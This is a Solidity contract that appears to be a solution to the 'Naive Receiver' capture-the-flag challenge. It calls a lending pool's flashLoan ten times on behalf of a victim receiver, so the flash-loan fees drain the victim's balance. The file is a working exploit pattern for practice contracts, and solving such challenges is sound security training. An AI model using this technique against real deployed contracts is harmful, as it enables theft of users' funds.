// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../naive-receiver/NaiveReceiverLenderPool.sol";

contract NaiveReceiverAttack {

    NaiveReceiverLenderPool poolAddr;

    constructor(address payable _pool){
        poolAddr = NaiveReceiverLenderPool(_pool);
    }

    function attack(address victimAddr, address assetAddr) public{
        for(uint i = 0; i < 10; i++){
            poolAddr.flashLoan(IERC3156FlashBorrower(victimAddr), assetAddr, 0, "");
        }
    }
}
